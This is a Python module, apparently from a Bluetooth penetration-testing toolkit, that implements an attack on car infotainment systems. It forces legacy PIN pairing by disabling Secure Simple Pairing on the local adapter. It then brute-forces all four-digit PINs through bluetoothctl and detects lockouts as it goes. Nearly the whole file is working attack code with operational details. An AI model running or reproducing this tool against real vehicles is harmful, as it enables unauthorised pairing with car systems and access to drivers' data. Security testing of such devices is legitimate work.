"""SSP Downgrade Attack — Force legacy PIN pairing from Secure Simple Pairing.

Forces an IVI (In-Vehicle Infotainment) from Secure Simple Pairing (SSP) mode
to legacy PIN-based pairing during a live pairing attempt, then brute-forces
the PIN code.

Attack principle:
  1. Probe target to confirm SSP is supported and check IO capabilities
  2. Disable SSP on the local adapter to force legacy auth negotiation
  3. Set IO capability to NoInputNoOutput to minimize SSP complexity
  4. Remove existing pairing state and initiate fresh pairing
  5. If the target falls back to legacy PIN mode, brute-force the PIN

Affected devices:
  - IVIs that accept legacy pairing as a fallback when the remote device
    does not support SSP (common in BT 2.1 through 4.x implementations)
  - Devices that do not enforce SSP-Only mode

Prerequisites:
  - Linux host with BlueZ (bluetoothctl, btmgmt, hciconfig)
  - Root access for adapter configuration changes

Limitations:
  - Modern devices enforcing SSP-Only mode will reject the downgrade
  - Some devices lock out after repeated failed PIN attempts
  - Requires the target to be in pairing/discoverable mode

References:
  - Bluetooth Core Spec v5.3, Vol 3, Part C, Section 5.2.2.6
  - "Cracking the Wireless Life" — legacy PIN vulnerability analysis
  - CVE-2020-26558 (related: Passkey Entry protocol weakness)
"""

import os
import re
import select
import subprocess
import time

from blue_tap.utils.bt_helpers import normalize_mac, run_cmd
from blue_tap.utils.output import info, success, error, warning
from blue_tap.core.result_schema import (
    EXECUTION_COMPLETED, EXECUTION_FAILED, EXECUTION_ERROR, EXECUTION_SKIPPED,
    build_run_envelope, make_execution, make_evidence, make_run_id, now_iso,
)
from blue_tap.core.cli_events import emit_cli_event


class SSPDowngradeAttack:
    """Force a target from SSP to legacy PIN pairing, then brute-force the PIN.

    Usage:
        attack = SSPDowngradeAttack("AA:BB:CC:DD:EE:FF")
        probe = attack.probe()
        if probe["legacy_fallback_possible"]:
            result = attack.downgrade_and_brute()
            if result["success"]:
                print(f"PIN: {result['pin_found']}")
    """

    def __init__(self, target: str, hci: str = "hci0"):
        self.target = normalize_mac(target)
        self.hci = hci
        self._results: dict = {
            "target": self.target,
            "hci": self.hci,
            "probe": None,
            "downgrade_success": None,
            "pin_found": None,
            "attempts": 0,
            "time_elapsed": 0.0,
            "notes": [],
        }
        self.run_id = make_run_id("ssp-downgrade")
        self._started_at = now_iso()
        self._cli_events: list[dict] = []
        self._executions: list[dict] = []

    def _emit(self, event_type: str, message: str, **details):
        evt = emit_cli_event(
            event_type=event_type, module="attack", run_id=self.run_id,
            target=self.target, adapter=self.hci, message=message,
            details=details,
        )
        self._cli_events.append(evt)

    def probe(self) -> dict:
        """Check if the target supports SSP and what IO capabilities it advertises.

        Uses hcitool info to query remote features and btmgmt info to check
        local adapter pairing mode. Determines whether legacy fallback is
        plausible.

        Returns:
            Dict with keys: ssp_supported, io_capability, legacy_fallback_possible.
        """
        phase_start = now_iso()
        self._emit("phase_started", "SSP probe starting")
        result = {
            "ssp_supported": None,
            "io_capability": None,
            "legacy_fallback_possible": False,
            "bt_version": None,
            "notes": [],
        }

        info(f"Probing SSP capabilities of {self.target}...")

        # Query remote device features via hcitool
        hci_info = run_cmd(
            ["hcitool", "-i", self.hci, "info", self.target],
            timeout=15,
        )
        if hci_info.returncode == 0:
            output = hci_info.stdout

            # Check for SSP in LMP features
            if "Secure Simple Pairing" in output:
                result["ssp_supported"] = True
                info("SSP support detected in LMP features")
            else:
                # SSP not in features — already legacy
                result["ssp_supported"] = False
                info("SSP not detected — device may already use legacy pairing")

            # Extract Bluetooth version
            ver_match = re.search(r"LMP Version:\s*(.+)", output)
            if ver_match:
                result["bt_version"] = ver_match.group(1).strip()
                info(f"Bluetooth version: {result['bt_version']}")

            # Parse IO capability if present in extended features
            io_match = re.search(r"IO Capability:\s*(.+)", output)
            if io_match:
                result["io_capability"] = io_match.group(1).strip()
                info(f"IO Capability: {result['io_capability']}")
        else:
            warning(f"Could not query remote device: {hci_info.stderr.strip()}")
            result["notes"].append("hcitool info failed — target may not be reachable")

        # Check local adapter SSP mode via btmgmt
        hci_index = self.hci.replace("hci", "")
        mgmt_info = run_cmd(
            ["btmgmt", "--index", hci_index, "info"],
            timeout=10,
        )
        if mgmt_info.returncode == 0:
            mgmt_output = mgmt_info.stdout
            if "ssp" in mgmt_output.lower():
                info("Local adapter supports SSP management")
            # Check current settings
            settings_match = re.search(
                r"current settings:\s*(.+)", mgmt_output, re.IGNORECASE
            )
            if settings_match:
                settings = settings_match.group(1).strip()
                info(f"Local adapter settings: {settings}")
                if "ssp" in settings.lower():
                    result["notes"].append("Local SSP currently enabled")
        else:
            warning(f"btmgmt info failed: {mgmt_info.stderr.strip()}")

        # Determine if legacy fallback is possible
        if result["ssp_supported"] is False:
            # Already legacy — no downgrade needed, PIN brute directly feasible
            result["legacy_fallback_possible"] = True
            result["notes"].append(
                "Target does not advertise SSP — legacy PIN pairing likely"
            )
        elif result["ssp_supported"] is True:
            # SSP present — downgrade may work if target doesn't enforce SSP-Only
            result["legacy_fallback_possible"] = True
            result["notes"].append(
                "SSP detected — downgrade attempt will disable local SSP "
                "to force legacy negotiation"
            )

            # BT 4.1+ with Secure Connections may resist downgrade
            if result["bt_version"]:
                ver_num = re.search(r"(\d+\.\d+)", result["bt_version"])
                if ver_num and float(ver_num.group(1)) >= 4.1:
                    result["notes"].append(
                        "BT 4.1+ — device may enforce Secure Connections Only mode"
                    )
        else:
            # Unknown SSP status — attempt anyway
            result["legacy_fallback_possible"] = True
            result["notes"].append("SSP status unknown — will attempt downgrade")

        self._results["probe"] = result
        self._executions.append(make_execution(
            kind="check", id="ssp_probe", title="SSP Downgrade Probe",
            module="attack", protocol="BR/EDR",
            execution_status=EXECUTION_COMPLETED,
            module_outcome="confirmed" if result["legacy_fallback_possible"] else "not_applicable",
            evidence=make_evidence(
                summary=f"SSP={result['ssp_supported']}, legacy_fallback={'possible' if result['legacy_fallback_possible'] else 'unlikely'}",
                confidence="medium",
                observations=result["notes"],
                module_evidence={"ssp_supported": result["ssp_supported"], "io_capability": result["io_capability"], "bt_version": result["bt_version"]},
            ),
            started_at=phase_start, completed_at=now_iso(),
            tags=["ssp", "downgrade", "probe"],
            module_data=result,
        ))
        self._emit("execution_result", f"SSP probe: legacy_fallback={'possible' if result['legacy_fallback_possible'] else 'unlikely'}")
        self._emit("run_completed", "SSP probe completed")
        return result

    def downgrade(self) -> bool:
        """Attempt to force the target into legacy PIN pairing mode.

        Disables SSP on the local adapter, sets IO capability to
        NoInputNoOutput, removes existing pairing, and initiates a fresh
        pair. Monitors the pairing output to determine if legacy PIN mode
        was successfully forced.

        Returns:
            True if legacy PIN mode was forced, False otherwise.
        """
        phase_start = now_iso()
        self._emit("phase_started", "SSP downgrade starting")
        info(f"Attempting SSP downgrade on {self.target}...")
        hci_index = self.hci.replace("hci", "")

        # Step 1: Set IO capability to NoInputNoOutput (cap 3)
        info("Setting IO capability to NoInputNoOutput...")
        io_result = run_cmd(
            ["sudo", "btmgmt", "--index", hci_index, "io-cap", "3"],
            timeout=5,
        )
        if io_result.returncode != 0:
            warning(f"btmgmt io-cap failed: {io_result.stderr.strip()}")
            # Fallback: try hciconfig
            run_cmd(
                ["sudo", "hciconfig", self.hci, "sspmode", "0"],
                timeout=5,
            )

        # Step 2: Remove any existing pairing
        info(f"Removing existing pairing with {self.target}...")
        run_cmd(["bluetoothctl", "remove", self.target], timeout=5)
        time.sleep(0.5)

        # Step 3: Disable SSP on local adapter
        info("Disabling SSP on local adapter...")
        ssp_result = run_cmd(
            ["sudo", "btmgmt", "--index", hci_index, "ssp", "off"],
            timeout=5,
        )
        if ssp_result.returncode != 0:
            warning(f"btmgmt ssp off failed: {ssp_result.stderr.strip()}")
            # Fallback via hciconfig
            fallback = run_cmd(
                ["sudo", "hciconfig", self.hci, "sspmode", "0"],
                timeout=5,
            )
            if fallback.returncode != 0:
                error("Failed to disable SSP via both btmgmt and hciconfig")
                self._results["notes"].append("SSP disable failed")
                self._executions.append(make_execution(
                    kind="action", id="ssp_downgrade", title="SSP Downgrade",
                    module="attack", protocol="BR/EDR",
                    execution_status=EXECUTION_FAILED,
                    module_outcome="failed",
                    evidence=make_evidence(
                        summary="SSP disable failed via btmgmt and hciconfig",
                        confidence="high",
                        observations=["btmgmt ssp off failed", "hciconfig sspmode 0 failed"],
                        module_evidence={},
                    ),
                    started_at=phase_start, completed_at=now_iso(),
                    tags=["ssp", "downgrade"],
                    module_data={"downgrade_success": False},
                ))
                return False

        info("SSP disabled — adapter will negotiate legacy pairing")
        time.sleep(0.5)

        # Step 4: Initiate pairing and monitor for PIN request vs SSP confirmation
        info(f"Initiating pairing with {self.target}...")
        legacy_mode = False

        try:
            proc = subprocess.Popen(
                ["bluetoothctl"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            # Set up agent that can handle PIN prompts
            setup_commands = [
                "agent off",
                "agent KeyboardOnly",
                "default-agent",
                f"pair {self.target}",
            ]
            for cmd in setup_commands:
                proc.stdin.write((cmd + "\n").encode())
                proc.stdin.flush()
                time.sleep(0.3)

            # Monitor output for PIN prompt (legacy) or confirmation (SSP)
            deadline = time.time() + 15
            output_buf = ""

            while time.time() < deadline:
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                ready, _, _ = select.select(
                    [proc.stdout], [], [], min(remaining, 0.3)
                )
                if ready:
                    chunk = os.read(proc.stdout.fileno(), 4096)
                    if not chunk:
                        break
                    output_buf += chunk.decode("utf-8", errors="replace")

                # PIN request = legacy mode forced successfully
                if "Enter PIN" in output_buf or "Pin code:" in output_buf:
                    legacy_mode = True
                    success("Legacy PIN mode forced! Target accepted downgrade.")
                    break

                # Passkey request can also indicate legacy-style interaction
                if "Enter passkey" in output_buf:
                    legacy_mode = True
                    success("Passkey entry mode detected (legacy-compatible).")
                    break

                # SSP confirmation = downgrade failed
                if "Confirm passkey" in output_buf or "yes/no" in output_buf.lower():
                    warning("SSP confirmation requested — downgrade did not succeed")
                    break

                # Pairing failed outright
                if "Failed to pair" in output_buf:
                    warning("Pairing failed — target may have rejected connection")
                    break

                # Already paired somehow
                if "Pairing successful" in output_buf:
                    info("Pairing succeeded (method undetermined)")
                    break

            # Cancel and clean up
            proc.stdin.write(b"quit\n")
            proc.stdin.flush()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

        except Exception as exc:
            error(f"Downgrade attempt error: {exc}")
            self._results["notes"].append(f"Exception during downgrade: {exc}")
            self._executions.append(make_execution(
                kind="action", id="ssp_downgrade", title="SSP Downgrade",
                module="attack", protocol="BR/EDR",
                execution_status=EXECUTION_ERROR,
                module_outcome="failed",
                evidence=make_evidence(
                    summary=f"Exception during downgrade: {exc}",
                    confidence="high",
                    observations=[str(exc)],
                    module_evidence={},
                ),
                started_at=phase_start, completed_at=now_iso(),
                tags=["ssp", "downgrade"],
                module_data={"exception": str(exc)},
            ))
            return False

        self._results["downgrade_success"] = legacy_mode
        if legacy_mode:
            self._results["notes"].append("SSP downgrade successful — legacy PIN mode")
        else:
            self._results["notes"].append(
                "SSP downgrade failed — target may enforce SSP-Only"
            )

        self._executions.append(make_execution(
            kind="action", id="ssp_downgrade", title="SSP Downgrade",
            module="attack", protocol="BR/EDR",
            execution_status=EXECUTION_COMPLETED,
            module_outcome="success" if legacy_mode else "failed",
            evidence=make_evidence(
                summary="Legacy PIN mode forced" if legacy_mode else "Downgrade did not succeed",
                confidence="high",
                observations=self._results["notes"],
                module_evidence={"legacy_mode": legacy_mode},
            ),
            started_at=phase_start, completed_at=now_iso(),
            tags=["ssp", "downgrade"],
            module_data={"downgrade_success": legacy_mode},
        ))
        return legacy_mode

    def downgrade_and_brute(
        self,
        pin_start: int = 0,
        pin_end: int = 9999,
        delay: float = 0.5,
    ) -> dict:
        """Execute SSP downgrade then brute-force the legacy PIN.

        Calls downgrade() first. If legacy mode is forced, iterates through
        PINs from pin_start to pin_end, attempting each via bluetoothctl with
        an agent that responds with the candidate PIN.

        Includes lockout detection: if 3 consecutive attempts timeout (>= 9s
        each), assumes the target has locked out and stops.

        Args:
            pin_start: First PIN to try (inclusive), default 0.
            pin_end: Last PIN to try (inclusive), default 9999.
            delay: Seconds between attempts, default 0.5.

        Returns:
            Dict with: success, pin_found, attempts, time_elapsed, notes.
        """
        phase_start = now_iso()
        self._emit("run_started", "SSP downgrade and brute force starting")
        result = {
            "success": False,
            "pin_found": None,
            "attempts": 0,
            "time_elapsed": 0.0,
            "downgrade_succeeded": False,
            "lockout_detected": False,
            "notes": [],
        }

        if pin_start > pin_end:
            error(f"Invalid PIN range: start ({pin_start}) > end ({pin_end})")
            result["notes"].append(f"Invalid range: {pin_start}-{pin_end}")
            self._executions.append(make_execution(
                kind="action", id="ssp_downgrade_brute", title="SSP Downgrade + PIN Brute Force",
                module="attack", protocol="BR/EDR",
                execution_status=EXECUTION_SKIPPED,
                module_outcome="not_applicable",
                evidence=make_evidence(
                    summary=f"Invalid PIN range: {pin_start}-{pin_end}",
                    confidence="high",
                    observations=[f"Invalid range: {pin_start}-{pin_end}"],
                    module_evidence={},
                ),
                started_at=phase_start, completed_at=now_iso(),
                tags=["ssp", "downgrade", "brute"],
                module_data=result,
            ))
            self._emit("run_completed", "SSP downgrade skipped: invalid PIN range")
            return result

        start_time = time.time()

        # Attempt the SSP downgrade
        downgraded = self.downgrade()
        result["downgrade_succeeded"] = downgraded

        if not downgraded:
            warning("SSP downgrade failed — PIN brute force may not work")
            result["notes"].append(
                "Downgrade failed; attempting brute force anyway (target may "
                "still accept legacy pairing)"
            )

        # Ensure SSP stays disabled for brute force
        hci_index = self.hci.replace("hci", "")
        run_cmd(
            ["sudo", "btmgmt", "--index", hci_index, "ssp", "off"],
            timeout=5,
        )

        info(
            f"Starting PIN brute force: {pin_start:04d}-{pin_end:04d} "
            f"(delay={delay}s)"
        )

        total = pin_end - pin_start + 1
        consecutive_timeouts = 0

        for i, code in enumerate(range(pin_start, pin_end + 1)):
            pin = f"{code:04d}"
            result["attempts"] = i + 1

            succeeded, elapsed = self._try_pin(pin)

            if succeeded:
                result["success"] = True
                result["pin_found"] = pin
                result["time_elapsed"] = time.time() - start_time
                success(
                    f"[{i + 1}/{total}] PIN found: {pin} "
                    f"({result['time_elapsed']:.1f}s total)"
                )
                self._results["pin_found"] = pin
                self._results["attempts"] = result["attempts"]
                self._results["time_elapsed"] = result["time_elapsed"]
                self._executions.append(make_execution(
                    kind="action", id="ssp_downgrade_brute", title="SSP Downgrade + PIN Brute Force",
                    module="attack", protocol="BR/EDR",
                    execution_status=EXECUTION_COMPLETED,
                    module_outcome="success",
                    evidence=make_evidence(
                        summary=f"PIN found: {pin} after {result['attempts']} attempts",
                        confidence="high",
                        observations=result["notes"],
                        module_evidence={"pin_found": pin, "attempts": result["attempts"]},
                    ),
                    started_at=phase_start, completed_at=now_iso(),
                    tags=["ssp", "downgrade", "brute"],
                    module_data=result,
                ))
                self._emit("run_completed", f"SSP brute force succeeded: PIN={pin}")
                return result

            # Lockout detection: 3+ consecutive timeouts
            if elapsed >= 9.0:
                consecutive_timeouts += 1
                if consecutive_timeouts >= 3:
                    error(
                        "Lockout detected: 3 consecutive timeouts. "
                        "Target may be rate-limiting."
                    )
                    result["notes"].append(
                        f"Lockout after {i + 1} attempts (3 consecutive timeouts)"
                    )
                    result["lockout_detected"] = True
                    break
            else:
                consecutive_timeouts = 0

            if i % 100 == 0 and i > 0:
                elapsed_total = time.time() - start_time
                rate = i / elapsed_total if elapsed_total > 0 else 0
                info(
                    f"[{i + 1}/{total}] Progress: tried {i} PINs "
                    f"({rate:.1f} attempts/sec)"
                )

            if delay > 0:
                time.sleep(delay)

        result["time_elapsed"] = time.time() - start_time
        self._results["attempts"] = result["attempts"]
        self._results["time_elapsed"] = result["time_elapsed"]

        if not result["success"]:
            warning(
                f"Exhausted PIN range {pin_start:04d}-{pin_end:04d} "
                f"({result['attempts']} attempts in {result['time_elapsed']:.1f}s)"
            )

        _brute_outcome = "lockout" if result["lockout_detected"] else "failed"
        self._executions.append(make_execution(
            kind="action", id="ssp_downgrade_brute", title="SSP Downgrade + PIN Brute Force",
            module="attack", protocol="BR/EDR",
            execution_status=EXECUTION_COMPLETED,
            module_outcome=_brute_outcome,
            evidence=make_evidence(
                summary=f"PIN not found after {result['attempts']} attempts; lockout={result['lockout_detected']}",
                confidence="high",
                observations=result["notes"],
                module_evidence={"attempts": result["attempts"], "lockout_detected": result["lockout_detected"]},
            ),
            started_at=phase_start, completed_at=now_iso(),
            tags=["ssp", "downgrade", "brute"],
            module_data=result,
        ))
        self._emit("run_completed", f"SSP brute force completed: outcome={_brute_outcome}")
        return result

    def _try_pin(self, pin: str) -> tuple[bool, float]:
        """Attempt pairing with a specific PIN via bluetoothctl.

        Spawns bluetoothctl with a KeyboardOnly agent, initiates pairing,
        waits for the PIN prompt, and sends the candidate PIN.

        Args:
            pin: The PIN string to try (e.g. "1234").

        Returns:
            Tuple of (success, time_taken_seconds).
        """
        # Remove existing pairing to start fresh
        run_cmd(["bluetoothctl", "remove", self.target], timeout=5)
        time.sleep(0.1)

        t_start = time.time()
        proc = None
        try:
            proc = subprocess.Popen(
                ["bluetoothctl"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            setup_commands = [
                "agent off",
                "agent KeyboardOnly",
                "default-agent",
                f"pair {self.target}",
            ]
            for cmd in setup_commands:
                proc.stdin.write((cmd + "\n").encode())
                proc.stdin.flush()
                time.sleep(0.2)

            # Wait for PIN prompt then send PIN
            deadline = t_start + 10
            output_buf = ""
            pin_sent = False

            while time.time() < deadline:
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                ready, _, _ = select.select(
                    [proc.stdout], [], [], min(remaining, 0.2)
                )
                if ready:
                    chunk = os.read(proc.stdout.fileno(), 4096)
                    if not chunk:
                        break
                    output_buf += chunk.decode("utf-8", errors="replace")

                if not pin_sent and (
                    "Enter PIN" in output_buf
                    or "Passkey" in output_buf
                    or "Pin code:" in output_buf
                ):
                    proc.stdin.write((pin + "\n").encode())
                    proc.stdin.flush()
                    pin_sent = True
                    time.sleep(0.5)

                if (
                    "Pairing successful" in output_buf
                    or "Failed to pair" in output_buf
                ):
                    break

            proc.stdin.write(b"quit\n")
            proc.stdin.flush()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

            output = output_buf
        except Exception:
            return False, time.time() - t_start
        finally:
            if proc is not None and proc.poll() is None:
                try:
                    proc.kill()
                    proc.wait(timeout=3)
                except (subprocess.TimeoutExpired, OSError):
                    pass

        elapsed = time.time() - t_start

        if "Pairing successful" in output:
            return True, elapsed

        return False, elapsed

    def build_envelope(self) -> dict:
        return build_run_envelope(
            schema="blue_tap.attack.result",
            module="attack",
            target=self.target,
            adapter=self.hci,
            operator_context={"command": "ssp-downgrade"},
            summary={
                "operation": "ssp_downgrade",
                "pin_found": self._results.get("pin_found"),
                "attempts": self._results.get("attempts", 0),
                "lockout_detected": any(
                    e.get("module_data", {}).get("lockout_detected") for e in self._executions
                ),
            },
            executions=self._executions,
            module_data={"cli_events": self._cli_events, **self._results},
            started_at=self._started_at,
            run_id=self.run_id,
        )

    def get_results(self) -> dict:
        """Return complete attack results for reporting.

        Consolidates probe data, downgrade status, PIN brute-force outcome,
        and all accumulated notes into a single dict.

        Returns:
            Dict with all attack results.
        """
        return dict(self._results)
